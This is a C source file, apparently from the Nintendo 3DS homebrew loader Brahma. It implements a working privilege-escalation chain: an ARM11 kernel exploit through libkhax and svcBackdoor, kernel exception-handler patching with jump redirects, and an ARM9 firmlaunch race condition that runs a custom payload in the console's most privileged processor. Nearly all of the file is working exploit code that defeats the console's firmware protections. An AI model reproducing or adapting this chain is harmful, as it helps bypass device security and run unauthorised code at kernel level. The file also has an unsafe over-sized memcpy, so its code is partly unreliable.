#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include "brahma.h"
#include "exploitdata.h"
#include "libkhax/khax.h"


/* should be the very first call. allocates heap buffer
   for ARM9 payload */ 
u32 brahma_init (void) {
	g_ext_arm9_buf = memalign(0x1000, ARM9_PAYLOAD_MAX_SIZE);
	return (g_ext_arm9_buf != 0);	
}

/* call upon exit */
u32 brahma_exit (void) {
	if (g_ext_arm9_buf) {
		free(g_ext_arm9_buf);
	}
	return 1;	
}

/* overwrites two instructions (8 bytes in total) at src_addr
   with code that redirects execution to dst_addr */ 
void redirect_codeflow (u32 *dst_addr, u32 *src_addr) {
	*(src_addr + 1) = dst_addr;
	*src_addr = ARM_JUMPOUT;	
}

/* fills exploit_data structure with information that is specific
   to 3DS model and firmware version
   returns: 0 on failure, 1 on success */ 
s32 get_exploit_data (struct exploit_data *data) {
	u32 fversion = 0;    
	u8  isN3DS = 0;
	s32 i;
	s32 result = 0;
	u32 sysmodel = SYS_MODEL_NONE;

	if(!data)
		return result;

	fversion = osGetFirmVersion();
	APT_CheckNew3DS(&isN3DS);
	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;

	/* copy platform and firmware dependent data */
	for(i=0; i < sizeof(supported_systems) / sizeof(supported_systems[0]); i++) {
		if (supported_systems[i].firm_version == fversion &&
			supported_systems[i].sys_model & sysmodel) {
				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
				result = 1;
				break;
		}
	}
	return result;
}

/* get system dependent data and set up ARM11 structures */
s32 setup_exploit_data (void) {
	s32 result = 0;

	if (get_exploit_data(&g_expdata)) {
		/* copy data required by code running in ARM11 svc mode */	
		g_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;
		g_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;
		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
		result = 1;
	}
	return result;
}

/* reads ARM9 payload from a given path.
   filename: full path of payload
   returns: 0 on failure, 1 on success */

/* reads ARM9 payload from memory.
   data: array of u8 containing the payload
   dsize: size of the data array
   returns: 0 on failure, 1 on success */
s32 load_arm9_payload_from_mem (u8* data, u32 dsize) {
	s32 result = 0;

	if ((data != NULL) && (dsize >= 8) && (dsize <= ARM9_PAYLOAD_MAX_SIZE)) {
		g_ext_arm9_size = dsize;
		memcpy(g_ext_arm9_buf, data, dsize);
		result = g_ext_arm9_loaded = 1;
	}
	
	return result;
}

/* copies ARM9 payload to FCRAM
   - before overwriting it in memory, Brahma creates a backup copy of
     the mapped firm binary's ARM9 entry point. The copy will be stored
     into offset 4 of the ARM9 payload during run-time.
     This allows the ARM9 payload to resume booting the Nintendo firmware
     code.
     Thus, the format of ARM9 payload written for Brahma is the following:
     - a branch instruction at offset 0 and
     - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */ 
s32 map_arm9_payload (void) {
	void *src;
	volatile void *dst;

	u32 size = 0;
	s32 result = 0;

	dst = (void *)(g_expdata.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);

	if (!g_ext_arm9_loaded) {
		// defaul ARM9 payload
		src = &arm9_start;
		size = (u8 *)&arm9_end - (u8 *)&arm9_start;
	}
	else {
		// external ARM9 payload
		src = g_ext_arm9_buf;
		size = g_ext_arm9_size;
	}

	if (size >= 0 && size <= ARM9_PAYLOAD_MAX_SIZE) {
		memcpy(dst, src, size);
		result = 1;
	}
	
	return result;
}

s32 map_arm11_payload (void) {
	void *src;
	volatile void *dst;
	u32 size = 0;
	u32 offs;
	s32 result_a = 0;
	s32 result_b = 0;

	src = &arm11_start;
	dst = (void *)(g_expdata.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
	size = (u8 *)&arm11_end - (u8 *)&arm11_start;

	// TODO: sanitize 'size' 
	if (size) {
		memcpy(dst, src, size);
		result_a = 1;
	}

	offs = size;
	src = &g_arm11shared;
	size = sizeof(g_arm11shared);
	
	dst = (u8 *)(g_expdata.va_exc_handler_base_W +
	      OFFS_EXC_HANDLER_UNUSED + offs);

	// TODO sanitize 'size'
	if (result_a && size) {
		memcpy(dst, src, size);
		result_b = 1;
	}

	return result_a && result_b;
}

void exploit_arm9_race_condition (void) {

	s32 (* const _KernelSetState)(u32, u32, u32, u32) =
	    (void *)g_expdata.va_kernelsetstate;
	
	asm volatile ("clrex");

	/* copy ARM11 payload and console specific data */
	if (map_arm11_payload() &&
		/* copy ARM9 payload to FCRAM */
		map_arm9_payload()) {

		/* patch ARM11 kernel to force it to execute
		   our code (hook1 and hook2) as soon as a
		   "firmlaunch" is triggered */ 	 
		redirect_codeflow(g_expdata.va_exc_handler_base_X +
		                  OFFS_EXC_HANDLER_UNUSED,
		                  g_expdata.va_patch_hook1);
	
		redirect_codeflow(PA_EXC_HANDLER_BASE +
		                  OFFS_EXC_HANDLER_UNUSED + 4,
		                  g_expdata.va_patch_hook2);

		CleanEntireDataCache();
		InvalidateEntireInstructionCache();

		// trigger ARM9 code execution through "firmlaunch"
		_KernelSetState(0, 0, 2, 0);		
		// prev call shouldn't ever return
	}
	return;
}
u32 frameBufferData[3];

/* restore svcCreateThread code (not really required,
   but just to be on the safe side) */
s32 priv_firm_reboot (void) {
	asm volatile ("cpsid aif");
	u32 *save = (u32 *)(g_expdata.va_fcram_base + 0x3FFFE00);  
	memcpy(save, frameBufferData, sizeof(u32) * sizeof(frameBufferData));

	exploit_arm9_race_condition();
	return 0;
}

/* perform firmlaunch. load ARM9 payload before calling this
   function. otherwise, calling this function simply reboots
   the handheld */
s32 firm_reboot (void) {
	// Make sure gfx is initialized
	gfxInitDefault();

	// Save the framebuffers for arm11.
	frameBufferData[0] = (u32)gfxGetFramebuffer(GFX_TOP, GFX_LEFT, NULL, NULL) + 0xC000000;
	frameBufferData[1] = (u32)gfxGetFramebuffer(GFX_TOP, GFX_RIGHT, NULL, NULL) + 0xC000000;
	frameBufferData[2] = (u32)gfxGetFramebuffer(GFX_BOTTOM, 0, NULL, NULL) + 0xC000000;
	gfxSwapBuffers();

	s32 fail_stage = 0;
	
	fail_stage++; /* platform or firmware not supported, ARM11 exploit failure */
	if (setup_exploit_data()) {
		fail_stage++; /* failure while trying to corrupt svcCreateThread() */
		if (khaxInit() == 0) {
			fail_stage++; /* Firmlaunch failure, ARM9 exploit failure*/
			svcBackdoor(priv_firm_reboot);
		}
	}

	/* we do not intend to return ... */
	return fail_stage;
}
